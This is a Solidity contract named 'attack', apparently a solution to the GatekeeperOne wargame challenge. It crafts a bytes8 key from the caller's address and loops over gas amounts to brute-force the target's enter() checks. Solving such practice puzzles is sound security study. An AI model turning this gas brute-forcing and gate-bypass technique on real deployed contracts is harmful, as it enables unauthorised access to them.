pragma solidity ^0.6.4;

contract attack {
    GatekeeperOne gateKeeper;
    bytes8 public key;

    constructor(address target) public {
        gateKeeper = GatekeeperOne(target);
        // key is 0x0000000F0000???? (???? being the last 2bites of your public address). Read README for more details
        key = 0x0000000F0000cDfF;
    }

    function letMeIn() public{
         for (uint256 i = 0; i < 500; i++) {
         (bool result, bytes memory data) = address(gateKeeper).call{gas:
          i + 150 + 8191*10}(abi.encodeWithSignature("enter(bytes8)", key));
      if(result)
        {
        break;
            }
         }
    }
}